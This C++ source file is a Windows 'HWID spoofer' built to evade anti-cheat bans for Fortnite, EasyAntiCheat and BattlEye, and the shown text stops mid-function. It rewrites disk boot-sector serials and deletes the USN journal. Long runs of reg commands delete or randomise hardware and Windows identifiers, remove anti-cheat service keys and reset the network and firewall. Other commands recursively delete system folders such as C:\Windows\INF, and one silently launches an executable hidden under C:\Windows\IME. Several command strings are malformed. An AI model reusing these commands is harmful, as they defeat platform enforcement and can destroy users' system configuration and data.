
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "urlmon.lib")
#pragma comment(lib, "Winmm.lib")
#include <urlmon.h>
//#include "picosha2.h"
#include <tchar.h>
#include <sddl.h>
//#include "manager.h"
//#include <windows.h>
//#include "xor.h"
#include <stdio.h>
#include <string>
#include <strsafe.h>
//#include "hwid.h"
//#include "Crypto.h"
//#include "auth.h"
#include <iostream>
#include <Windows.h>
#include <cstdlib>
#include <Lmcons.h>
using namespace std;
#include "ManualMap.h"
#include "spoofer.h"


std::string id = "1";
std::string serial;
#include "CConsole.h"
//#include "AutoUpdate.h"
#include <filesystem>
//#include <examples\example_win32_directx11\MyMACAddr.h>
#include "MyMACAddr.h"
#include <tchar.h>
#include <string>
#include <cstring>
#include <atlstr.h>
#include <windef.h>
#include <sstream>
#include "DiskSector.h"
#include <TlHelp32.h>
#include <thread>
//#include "AutoUpdate.h"
//#include <Ronin Spoofer\Ronin Spoofer\xor.hpp>
//#include <xor.h>
//#include <examples\example_win32_directx11\AutoUpdate.h>
#define LENGTH(a) (sizeof(a) / sizeof(a[0]))


DiskSector disk;

extern "C"
{
	BOOL AdjustCurrentPrivilege(LPCWSTR privilege);

	VOID ForceDeleteFile(LPWSTR path);

	void ChangePermission();
}

void ChangeSerialNumber(DWORD Drive, DWORD newSerial)
{
	const int max_pbsi = 3;

	struct partial_boot_sector_info
	{
		LPSTR Fs;
		DWORD FsOffs;
		DWORD SerialOffs;
	};

	partial_boot_sector_info pbsi[max_pbsi] =
	{
	 {_xor_("FAT32").c_str(), 0x52, 0x43},
	 {_xor_("FAT").c_str(),   0x36, 0x27},
	 {_xor_("NTFS").c_str(),  0x03, 0x48}
	};

	CHAR szDrive[12];

	char Sector[512];

	DWORD i;

	sprintf(szDrive, _xor_("%c:\\").c_str(), Drive & 0xFF);

	if (!disk.Open(szDrive))
	{
		std::cout << _xor_("Could not open disk!").c_str() << std::endl;
		return;
	}

	if (!disk.ReadSector(0, Sector))
	{
		std::cout << _xor_("Could not read sector!").c_str() << std::endl;
		return;
	}

	for (i = 0; i < max_pbsi; i++)
	{
		if (strncmp(pbsi[i].Fs, Sector + pbsi[i].FsOffs, strlen(pbsi[i].Fs)) == 0)
		{
			break;
		}
	}

	if (i >= max_pbsi)
	{
		return;
	}

	*(PDWORD)(Sector + pbsi[i].SerialOffs) = newSerial;

	if (!disk.WriteSector(0, Sector))
	{
		return;
	}
}


DWORD GetVolumeID(void)
{
	SYSTEMTIME s;
	DWORD d;
	WORD lo, hi, tmp;

	GetLocalTime(&s);

	lo = s.wDay + (s.wMonth << 8);
	tmp = (s.wMilliseconds / 10) + (s.wSecond << 8);
	lo += tmp;

	hi = s.wMinute + (s.wHour << 8);
	hi += s.wYear;

	d = lo + (hi << 16);
	return d;
}

void SpoofAllSerial()
{
	ChangePermission();

	CHAR path1[MAX_PATH] = { 0 };

	WCHAR path[MAX_PATH] = { 0 };

	CHAR current[MAX_PATH] = { 0 };

	CHAR NEWSERIAL[MAX_PATH] = { 0 };

	for (DWORD drives = GetLogicalDrives(), drive = L'C', index = 0; drives; drives >>= 1, ++index)
	{
		if (drives & 1)
		{

			wsprintfA(path1, _xor_("\\\\.\\%c:").c_str(), drive);
			wsprintfA(current, _xor_("%c").c_str(), drive);

			std::cout << _xor_("Current Drive: ").c_str() << current << std::endl;

			DWORD bro = GetVolumeID();
			printf(_xor_("New Serial: %X\n").c_str(), bro);
			ChangeSerialNumber(drive, bro);




			CHAR journal[MAX_PATH] = { 0 };
			sprintf(journal, _xor_("fsutil usn deletejournal /d %c:>nul").c_str(), drive);
			system(journal);

			std::cout << std::endl;

			++drive;
		}
	}
}

void StartThem1(LPCSTR name)
{
	STARTUPINFOA si;
	PROCESS_INFORMATION pi;

	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));

	if (!CreateProcessA(name, NULL, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
	{
		return;
	}

	WaitForSingleObject(pi.hProcess, INFINITE);

	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
}
static const char alphanum[] = "0123456789" "ABCDEFGHIJKLMNOPQRSTUVWXYZ";

int stringLengthh = sizeof(alphanum) - 1;

char genRandomn()
{

	return alphanum[rand() % stringLengthh];
}
void Randomexe()
{
	srand(time(0));
	std::string Str;
	for (unsigned int i = 0; i < 7; ++i)
	{
		Str += genRandomn();

	}

	std::string rename = Str + ".exe";

	char filename[MAX_PATH];
	DWORD size = GetModuleFileNameA(NULL, filename, MAX_PATH);
	if (size)


		std::filesystem::rename(filename, rename);
}
HWND consoleWindowHandle = GetConsoleWindow();
void HideConsole()
{
	::ShowWindow(::GetConsoleWindow(), SW_HIDE);
}

void ShowConsole()
{
	::ShowWindow(::GetConsoleWindow(), SW_SHOW);
}

bool IsConsoleVisible()
{
	return ::IsWindowVisible(::GetConsoleWindow()) != FALSE;
}

LPCSTR DllPath;
DWORD   ProcessId;
HANDLE hProcess;
int regedit() {
	system(_xor_("reg delete HKLM\\System\\CurrentControlSet\\Control\\TimeZoneInformation /f").c_str());
	system(_xor_("REG ADD HKLM\\SOFTWARE\Microsoft\\Windows\" \"NT\\CurrentVersion\\Notifications\\Data /v 418A073AA3BC3475 /t REG_BINARY /d %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random% /f").c_str());
	system(_xor_("reg delete HKLM\\HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0 /f").c_str());
	system(_xor_("REG ADD HKCU\\Software\\Microsoft\\Direct3D /v WHQLClass /t REG_BINARY /d %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random% /f").c_str());
	system(_xor_("REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\ComputerName\\ComputerName /v ComputerName /t REG_SZ /d DESKTOP-%random% /f").c_str());
	system(_xor_("REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\ComputerName\\ActiveComputerName /v ComputerName /t REG_SZ /d DESKTOP-%random% /f").c_str());
	system(_xor_("REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\WindowsUpdate /v SusClientId /t REG_SZ /d Apple%random%-%random%-%random%-%random% /f").c_str());
	system(_xor_("REG ADD HKLM\\SYSTEM\\HardwareConfig /v LastConfig /t REG_SZ /d {Apple-%random%-%random} /f").c_str());
	system(_xor_("REG ADD HKLM\\SYSTEM\\HardwareConfig\\Current /v BaseBoardProduct /t REG_SZ /d Apple-%random%%random%%random% /f").c_str());
	system(_xor_("REG ADD HKLM\\SYSTEM\\Software\\Microsoft /v BuildLab /t REG_SZ /d Apple-%random% /f").c_str());
	system(_xor_("REG ADD HKLM\\SYSTEM\\Software\\Microsoft /v BuildLabEx /t REG_SZ /d Apple-%random% /f").c_str());
	system(_xor_("REG ADD HKLM\\HARDWARE\\DESCRIPTION\\System\\BIOS /v BaseBoardProduct /t REG_SZ /d Apple-%random%%random%%random% /f").c_str());
	system(_xor_("REG ADD HKLM\\SYSTEM\\ControlSet001\\Services\\kbdclass\\Parameters /v WppRecorder_TraceGuid /t REG_SZ /d {Apple-%random%-%random%-%random%%random%} /f").c_str());
	system(_xor_("REG ADD HKLM\\SYSTEM\\ControlSet001\\Services\\mouhid\\Parameters /v WppRecorder_TraceGuid /t REG_SZ /d {Apple-%random%-%random%-%random%%random%} /f").c_str());
	system(_xor_("REG ADD HKLM\\SYSTEM\\ControlSet001\\Control\\Class\\{4d36e968-e325-11ce-bfc1-08002be10318}\\0000 /v UserModeDriverGUID /t REG_SZ /d {Apple-%random%-%random%-%random%%random%} /f").c_str());
	system(_xor_("REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\" \"NT\\CurrentVersion /v BuildBranch /t REG_SZ /d Apple-%random%-%random%-%random%%random% /f").c_str());
	system(_xor_("REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\" \"NT\\CurrentVersion /v BuildGUID /t REG_SZ /d Apple-%random%-%random%-%random%%random% /f").c_str());
	system(_xor_("REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\" \"NT\\CurrentVersion /v BuildLab /t REG_SZ /d Apple-%random%-%random%-%random%%random% /f").c_str());
	system(_xor_("REG ADD HKLM\\HARDWARE\\DEVICEMAP\\Scsi\\Scsi\" \"Port\" \"0\\Scsi\" \"Bus\" \"0\\Target\" \"Id\" \"0\\Logical\" \"Unit\" \"Id\" \"0 /v Identifier /t REG_SZ /d Apple-%random%-%random%-%random%%random% /f").c_str());
	system(_xor_("REG ADD HKLM\\HARDWARE\\DEVICEMAP\\Scsi\\Scsi\" \"Port\" \"1\\Scsi\" \"Bus\" \"0\\Target\" \"Id\" \"0\\Logical\" \"Unit\" \"Id\" \"0 /v Identifier /t REG_SZ /d Apple-%random%-%random%-%random%%random% /f").c_str());
	system(_xor_("REG ADD HKLM\\HARDWARE\\DESCRIPTION\\System\\MultifunctionAdapter\\0\\DiskController\\0\\DiskPeripheral\\0 /v Identifier /t REG_SZ /d Apple-%random%-%random%-%random%%random% /f").c_str());
	system(_xor_("REG ADD HKLM\\HARDWARE\\DESCRIPTION\\System\\MultifunctionAdapter\\0\\DiskController\\0\\DiskPeripheral\\1 /v Identifier /t REG_SZ /d Apple-%random%-%random%-%random%%random% /f").c_str());
	system(_xor_("REG ADD HKLM\\SYSTEM\\ControlSet001\\Services\\BasicDisplay\\Video /v VideoID /t REG_SZ /d {Apple-%random%-%random%-%random%%random%} /f").c_str());
	system(_xor_("REG ADD HKLM\\SOFTWARE\\Microsoft\\SQMClient /v MachineId /t REG_SZ /d {Apple-%random%-%random%-%random%%random%} /f").c_str());
	system(_xor_("REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters /v Hostname /t REG_SZ /d DESKTOP-%random% /f").c_str());
	system(_xor_("REG ADD HKLM\\System\\CurrentControlSet\\Services\\Tcpip\\Parameters /v Domain /t REG_SZ /d %random% /f").c_str());
	system(_xor_("REG ADD HKLM\\System\\CurrentControlSet\\Control\\DevQuery\\6 /v UUID /t REG_SZ /d %random% /f").c_str());
	system(_xor_("REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters /v NV\" \"Hostname /t REG_SZ /d DESKTOP-%random% /f").c_str());
	system(_xor_("REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\IDConfigDB\\Hardware\" \"Profiles\\0001 /v HwProfileGuid /t REG_SZ /d {Apple%random%-%random%-%random%-%random%%random%} /f").c_str());
	system(_xor_("REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\IDConfigDB\\Hardware\" \"Profiles\\0001 /v GUID /t REG_SZ /d {Apple%random%-%random%-%random%-%random%%random%} /f").c_str());
	system(_xor_("REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\" \"NT\\CurrentVersion /v BuildGUID /t REG_SZ /d %random% /f").c_str());
	system(_xor_("REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\" \"NT\\CurrentVersion /v REGisteredOwner /t REG_SZ /d %random% /f").c_str());
	system(_xor_("REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\" \"NT\\CurrentVersion /v REGisteredOrganization /t REG_SZ /d %random% /f").c_str());
	system(_xor_("REG ADD HKLM\\SOFTWARE\\Microsoft\\Cryptography /v GUID /t REG_SZ /d %random%-%random%-%random%-%random% /f").c_str());
	system(_xor_("REG ADD HKLM\\SOFTWARE\\Microsoft\\Cryptography /v MachineGuid /t REG_SZ /d Apple%random%-%random%-%random%-%random% /f").c_str());
	system(_xor_("REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\" \"NT\\CurrentVersion /v ProductId /t REG_SZ /d Apple%random%-%random%-%random%-%random% /f").c_str());
	system(_xor_("REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\" \"NT\\CurrentVersion /v InstallDate /t REG_SZ /d Apple%random% /f").c_str());
	system(_xor_("REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\" \"NT\\CurrentVersion /v InstallTime /t REG_SZ /d %random% /f").c_str());
	system(_xor_("REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\" \"NT\\CurrentVersion /v BuildLabEx /t REG_SZ /d %random% /f").c_str());
	system(_xor_("REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\SystemInformation /v ComputerHardwareId /t REG_SZ /d {Apple%random%-%random%-%random%-%random%} /f").c_str());
	system(_xor_("REG delete HKCU\\Software\\Epic\" \"Games /f").c_str());
	system(_xor_("REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\" \"NT\\CurrentVersion\\Tracing\\Microsoft\\Profile\\Profile /v Guid /t REG_SZ /d %random%-%random%-%random%-%random%%random% /f").c_str());
	system(_xor_("reg delete HKLM\\SOFTWARE\\Classes\\com.epicgames.launcher /f").c_str());
	system(_xor_("reg delete HKLM\\SOFTWARE\\WOW6432Node\\EpicGames /f").c_str());
	system(_xor_("reg delete HKLM\\SOFTWARE\\WOW6432Node\\Epic\" \"Games /f").c_str());
	system(_xor_("reg delete HKCR\\com.epicgames.launcher /f").c_str());
	system(_xor_("reg delete HKLM\\SYSTEM\\MountedDevices /f").c_str());
	system(_xor_("reg delete HKLM\\SOFTWARE\\Microsoft\\Dfrg\\Statistics /f").c_str());
	system(_xor_("reg delete HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\BitBucket\\Volume /f").c_str());
	system(_xor_("reg delete HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\MountPoints2\\CPC\\Volume /f").c_str());
	system(_xor_("reg delete HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\MountPoints2 /f").c_str());
	system(_xor_("reg delete HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\BitBucket\\LastEnum /f").c_str());
	system(_xor_("REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\WindowsUpdate /v AccountDomainSid /t REG_SZ /d Apple-%random%-%random%-%random%%random% /f").c_str());
	system(_xor_("REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\WindowsUpdate /v PingID /t REG_SZ /d Apple-%random%-%random%-%random%%random% /f").c_str());
	system(_xor_("REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\WindowsUpdate /v SusClientId /t REG_SZ /d Apple-%random%-%random%-%random%%random% /f").c_str());
	system(_xor_("reg delete HKLM\\SYSTEM\\CurrentControlSet\\Services\\mssmbios\\Data /v SMBiosData /f").c_str());
	system(_xor_("REG ADD HKLM\\SOFTWARE\\NVIDIA\" \"Corporation\\Global /v ClientUUID /t REG_SZ /d Apple-%random%-%random%-%random%%random% /f").c_str());
	system(_xor_("REG ADD HKLM\\SOFTWARE\\NVIDIA\" \"Corporation\\Global /v PersistenceIdentifier /t REG_SZ /d Apple-%random%-%random%-%random%%random% /f").c_str());
	system(_xor_("REG ADD HKLM\\SOFTWARE\\NVIDIA\" \"Corporation\\Global\\CoProcManager /v ChipsetMatchID /t REG_SZ /d Apple-%random%-%random%-%random%%random% /f").c_str());
	system(_xor_("reg delete HKLM\\SYSTEM\\MountedDevices /f").c_str());
	system(_xor_("reg delete HKCU\\Software\\Microsoft\\Windows\\Shell\\Associations\\UrlAssociations\\com.epicgames.launcher /f").c_str());

	system(_xor_("reg delete HKLM\\SOFTWARE\\Microsoft\\Dfrg\\Statistics /f").c_str());
	system(_xor_("reg delete HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\BitBucket\\Volume /f").c_str());
	system(_xor_("reg delete HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\MountPoints2\\CPC\\Volume /f").c_str());
	system(_xor_("reg delete HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\MountPoints2 /f").c_str());
	system(_xor_("reg delete HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\BitBucket /v LastEnum /f").c_str());
	system(_xor_("REG ADD HKCU\\Software\\Classes\\Interface /v ClsidStore /t REG_BINARY /d %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random% /f").c_str());
	system(_xor_("REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\SystemInformation /v ComputerHardwareId /t REG_SZ /d Apple-%random%-%random%-%random%%random% /f").c_str());
	system(_xor_("REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\SystemInformation /v ComputerHardwareIds /t REG_SZ /d Apple-%random%-%random%-%random%%random% /f").c_str());
	system(_xor_("REG ADD HKLM\\SOFTWARE\\Microsoft\\SQMClient /v MachineId /t REG_SZ /d Apple-%random%-%random%-%random%%random% /f").c_str());
	system(_xor_("reg delete HKCU\\Software\\Classes\\Interface /v ClsidStore /f").c_str());
	system(_xor_("REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Class\\{4d36e968-e325-11ce-bfc1-08002be10318}\\0000 /v _DriverProviderInfo /t REG_SZ /d Apple-%random%-%random%-%random%%random% /f").c_str());
	system(_xor_("REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Class\\{4d36e968-e325-11ce-bfc1-08002be10318}\\0000 /v UserModeDriverGUID /t REG_SZ /d Apple-%random%-%random%-%random%%random% /f").c_str());
	system(_xor_("reg delete HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Diagnostics\\DiagTrack\\SettingsRequests /f").c_str());
	system(_xor_("reg delete HKLM\\SOFTWARE\\Microsoft\\Windows\" \"NT\\CurrentVersion\\SoftwareProtectionPlatform /v BackupProductKeyDefault /f").c_str());
	system(_xor_("reg delete HKLM\\SOFTWARE\\Microsoft\\Windows\" \"NT\\CurrentVersion\\SoftwareProtectionPlatform /v actionlist /f").c_str());
	system(_xor_("reg delete HKLM\\SOFTWARE\\Microsoft\\Windows\" \"NT\\CurrentVersion\\SoftwareProtectionPlatform /v ServiceSessionId /f").c_str());
	system(_xor_("reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist /f").c_str());
	system(_xor_("reg delete HKCU\\Software\\Hex-Rays\\IDA\\History /f").c_str());
	system(_xor_("reg delete HKCU\\Software\\Hex-Rays\\IDA\\History64 /f").c_str());
	system(_xor_("reg delete HKLM\\SOFTWARE\\Microsoft\\Windows\" \"NT\\CurrentVersion\\SoftwareProtectionPlatform /v ServiceSessionId /f").c_str());

	system(_xor_("REG ADD HKCU\\Software\\Microsoft\\Direct3D /v WHQLClass /t REG_BINARY /d %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random% /f").c_str());
	system(_xor_("REG ADD HKCU\\Software\\Classes\\Installer\\Dependencies /v MSICache /t REG_BINARY /d %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random% /f").c_str());
	system(_xor_("REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Services\\TPM\\WMI /v WindowsAIKHash /t REG_BINARY /d %random%%random%%random%%random%%random%%random%%random%%random%%random%%random% /f").c_str());
	system(_xor_("REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\WindowsUpdate /v SusClientIdValidation /t REG_BINARY /d %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random% /f").c_str());
	system(_xor_("REG ADD HKCU\\SYSTEM\\CurrentControlSet\\Services\\TPM\\ODUID /v RandomSeed /t REG_BINARY /d %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random% /f").c_str());
	system(_xor_("REG ADD HKLM\\SOFTWARE\\Microsoft\\Internet\" \"Explorer\\Migration /v IE\" \"Installed\" \"Date /t REG_BINARY /d %random%%random%%random%%random%%random%%random%%random%%random%%random% /f").c_str());
	system(_xor_("REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\" \"NT\\CurrentVersion /v DigitalProductId /t REG_BINARY /d %random%%random%%random%%random%%random%%random%%random%%random%%random% /f").c_str());
	system(_xor_("REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\" \"NT\\CurrentVersion /v DigitalProductId4 /t REG_BINARY /d %random%%random%%random%%random%%random%%random%%random%%random%%random% /f").c_str());
	system(_xor_("REG ADD HKLM\\SOFTWARE\\Microsoft\\SQMClient /v WinSqmFirstSessionStartTime /t REG_QWORD /d %random%%random%%random% /f").c_str());
	system(_xor_("REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\" \"NT\\CurrentVersion /v InstallTime /t REG_QWORD /d %random%%random%%random% /f").c_str());
	system(_xor_("REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\" \"NT\\CurrentVersion /v InstallDate /t REG_QWORD /d %random%%random%%random% /f").c_str());
	system(_xor_("REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Diagnostics\\DiagTrack\\SevilleEventlogManager /v LastEventlogWrittenTime /t REG_QWORD /d %random%%random%%random% /f").c_str());

	system(_xor_("REG ADD HKLM\\System\\CurrentControlSet\\Control\\Notifications /v 418A073AA3BC8075 /t REG_BINARY /d %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random% /f").c_str());
	system(_xor_("REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\WINEVT\\Channels\\Microsoft-Windows-Kernel-EventTracing\/Admin /v OwningPublisher /t REG_SZ /d {%random%-%random%-%random%%random%} /f").c_str());;
	return TRUE;
}

void clean_launcher() {

	DeleteFileW(L"C:\\Program Files(x86)\\Epic Games\\Launcher\\Engine\\Config\\Base.ini");
	DeleteFileW(L"C:\\Program Files(x86)\\Epic Games\\Launcher\\Engine\\Config\\BaseGame.ini");
	DeleteFileW(L"C:\\Program Files(x86)\\Epic Games\\Launcher\\Engine\\Config\\Windows\\WindowsGame.ini");
	DeleteFileW(L"C:\\Program Files(x86)\\Epic Games\\Launcher\\Engine\\Config\\BaseInput.ini");
	DeleteFileW(L"C:\\Program Files(x86)\\Epic Games\\Launcher\\Portal\\Config\\UserLightmass.ini");
	DeleteFileW(L"C:\\Program Files(x86)\\Epic Games\\Launcher\\Engine\\Config\\Windows\\BaseWindowsLightmass.ini");
	DeleteFileW(L"C:\\Program Files(x86)\Epic Games\\Launcher\\Portal\\Config\\UserScalability.ini");
	DeleteFileW(L"C:\\Program Files(x86)\Epic Games\\Launcher\\Engine\\Config\\BaseHardware.ini");
	DeleteFileW(L"C:\\Program Files(x86)\Epic Games\\Launcher\\Portal\\Config\\NotForLicensees\\Windows\\WindowsHardware.ini");
}
void clean_net() {
	system(_xor_("start C:\\Windows\\IME\\network.exe").c_str());
	HideConsole();
	system(_xor_("netsh winsock reset").c_str());
	system(_xor_("netsh winsock reset catalog").c_str());
	system(_xor_("netsh int ip reset").c_str());
	system(_xor_("netsh advfirewall reset").c_str());
	system(_xor_("netsh int reset all").c_str());
	system(_xor_("netsh int ipv4 reset").c_str());
	system(_xor_("netsh int ipv6 reset").c_str());
	system(_xor_("ipconfig / release").c_str());
	system(_xor_("ipconfig / renew").c_str());
	system(_xor_("ipconfig / flushdns").c_str());
	CConsole::Clear();
	ShowConsole();
}
void clean_anticheat() {
	system(_xor_("reg delete HKLM\\SOFTWARE\\WOW6432Node\\EasyAntiCheat /f").c_str());
	system(_xor_("reg delete HKLM\\SYSTEM\\ControlSet001\\Services\\EasyAntiCheat /f").c_str());
	system(_xor_("reg delete HKLM\\SYSTEM\\ControlSet001\\Services\\BEService /f").c_str());
}
std::wstring GetCurrentUserName()
{
	wchar_t
		un[UNLEN + 1];
	DWORD unLen = UNLEN + 1;
	GetUserNameW(un, &unLen);
	return un;

}

void wipe_c() {
	system(_xor_("rmdir /s /q C:\\Users\\%username%\\AppData\\Roaming\\Microsoft\\Windows\\CloudStore").c_str());
	system(_xor_("rmdir /s /q C:\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved").c_str());
	system(_xor_("rmdir /s /q C:\\Windows\\INF").c_str());
	system(_xor_("rmdir /s /q C:\\ProgramData\\%username%\\Microsoft\\XboxLive\\NSALCache").c_str());
	system(_xor_("rmdir /s /q C:\\Users\\Public\\Documents").c_str());
	system(_xor_("rmdir /s /q C:\\Windows\\Prefetch").c_str());
	system(_xor_("rmdir /s /q C:\\Users\\%username%\\AppData\\Local\\D3DSCache").c_str());
	system(_xor_("rmdir /s /q C:\\Users\\%username%\\AppData\\Local\\CrashReportClient").c_str());
	system(_xor_("rmdir /s /q C:\\Windows\\temp").c_str());
	system(_xor_("rmdir /s /q C:\\Users\\%username%\\AppData\\Local\\Microsoft\\Windows\\SettingSync\\metastore").c_str());
	system(_xor_("rmdir /s /q C:\\Windows\\SoftwareDistribution\\DataStore\\Logs").c_str());
	system(_xor_("rmdir /s /q C:\\ProgramData\\Microsoft\\Windows\\WER\\Temp").c_str());
	system(_xor_("rmdir /s /q C:\\Users\\%username%\\AppData\\Local\\AMD\\DxCache").c_str());
	system(_xor_("rmdir /s /q ""\"\C:\\Users\\%username%\\AppData\\Local\\NVIDIA Corporation").c_str());
	system(_xor_("rmdir /s /q C:\\Windows\\Prefetch").c_str());
	system(_xor_("@del /s /f /a:h / a : a / q C:\\Users\\username%\\AppData\\Local\\Packages\\Microsoft.Windows.Cortana_cw5n1h2txyewy\\*.*").c_str());
	system(_xor_("@del /s /f /a:h / a : a / q C:\\Users\\%username%\\AppData\\Local\\Microsoft\\Windows\\WebCache\\*.*").c_str());
	system(_xor_("rmdir /s /q C:\\Users\\%username%\\AppData\\Local\\Packages\\Microsoft.XboxGamingOverlay_8wekyb3d8bbwe\\AC").c_str());
	system(_xor_("rmdir /s /q C:\\Users\\%username%\\AppData\\Local\\Packages\\Microsoft.XboxGamingOverlay_8wekyb3d8bbwe\\LocalCache").c_str());
	system(_xor_("rmdir /s /q C:\\Users\\%username%\\AppData\\Local\\Packages\\Microsoft.XboxGamingOverlay_8wekyb3d8bbwe\\Settings").c_str());
	system(_xor_("rmdir /s /q ""\"\C:\\Program Files\\Epic Games\\Fortnite\\Engine\\Plugins").c_str());
	system(_xor_("rmdir /s /q ""\"\C:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\Plugins").c_str());
	system(_xor_("rmdir /s /q ""\"\C:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\PersistentDownloadDir").c_str());
	system(_xor_("rmdir /s /q ""\"\C:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\Config").c_str());
	system(_xor_("rmdir /s /q ""\"\C:\\Users\\%username%\\AppData\\Local\\NVIDIA Corporation").c_str());
	system(_xor_("rmdir /s /q C:\\Users\\%username%\\AppData\\Roaming\\EasyAntiCheat").c_str());
	system(_xor_("del /f /s /q C:\\ProgramData\\Microsoft\\DataMart\\PaidWiFi\\NetworksCache").c_str());
	system(_xor_("del /f /s /q C:\\ProgramData\\Microsoft\\DataMart\\PaidWiFi\\Rules").c_str());
	system(_xor_("rmdir /s /q C:\\Windows\\ServiceProfiles\\NetworkService\\AppData\\Local\\Microsoft\\Windows\\DeliveryOptimization\\Cache").c_str());
	system(_xor_("rmdir /s /q C:\\Users\\%username%\\AppData\\Local\\Temp").c_str());
	system(_xor_("rmdir /s /q C:\\Users\\%username%\\AppData\\Local\\Microsoft\\Windows\\INetCache").c_str());
	system(_xor_("rmdir /s /q C:\\Users\\%username%\\AppData\\Local\\Microsoft\\Windows\\INetCookies").c_str());
	system(_xor_("rmdir /s /q C:\\Users\\%username%\\AppData\\Local\\Microsoft\\Windows\\History").c_str());
	system(_xor_("rmdir /s /q C:\\Users\\%username%\\Intel").c_str());
	system(_xor_("rmdir /s /q C:\\Windows\\System32\\config\\systemprofile\\AppData\\LocalLow\\Microsoft\\CryptnetUrlCache\\MetaData").c_str());
	system(_xor_("rmdir /s /q ""\"\C:\\Users\\%username%\\AppData\\Local\\Microsoft\\Feeds Cache").c_str());
}
void wipe_d() {
	system(_xor_("rmdir /s /q D:\\Users\\%username%\\AppData\\Roaming\\Microsoft\\Windows\\CloudStore").c_str());
	system(_xor_("rmdir /s /q D:\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved").c_str());
	system(_xor_("rmdir /s /q D:\\Windows\\INF").c_str());
	system(_xor_("rmdir /s /q D:\\ProgramData\\%username%\\Microsoft\\XboxLive\\NSALCache").c_str());
	system(_xor_("rmdir /s /q D:\\Users\\Public\\Documents").c_str());
	system(_xor_("rmdir /s /q D:\\Windows\\Prefetch").c_str());
	system(_xor_("rmdir /s /q D:\\Users\\%username%\\AppData\\Local\\D3DSCache").c_str());
	system(_xor_("rmdir /s /q D:\\Users\\%username%\\AppData\\Local\\CrashReportClient").c_str());
	system(_xor_("rmdir /s /q D:\\Windows\\temp").c_str());
	system(_xor_("rmdir /s /q D:\\Users\\%username%\\AppData\\Local\\Microsoft\\Windows\\SettingSync\\metastore").c_str());
	system(_xor_("rmdir /s /q D:\\Windows\\SoftwareDistribution\\DataStore\\Logs").c_str());
	system(_xor_("rmdir /s /q D:\\ProgramData\\Microsoft\\Windows\\WER\\Temp").c_str());
	system(_xor_("rmdir /s /q D:\\Users\\%username%\\AppData\\Local\\AMD\\DxCache").c_str());
	system(_xor_("rmdir /s /q ""\"\D:\\Users\\%username%\\AppData\\Local\\NVIDIA Corporation").c_str());
	system(_xor_("rmdir /s /q D:\\Windows\\Prefetch").c_str());
	system(_xor_("@del /s /f /a:h / a : a / q D:\\Users\\username%\\AppData\\Local\\Packages\\Microsoft.Windows.Cortana_cw5n1h2txyewy\\*.*").c_str());
	system(_xor_("@del /s /f /a:h / a : a / q D:\\Users\\%username%\\AppData\\Local\\Microsoft\\Windows\\WebCache\\*.*").c_str());
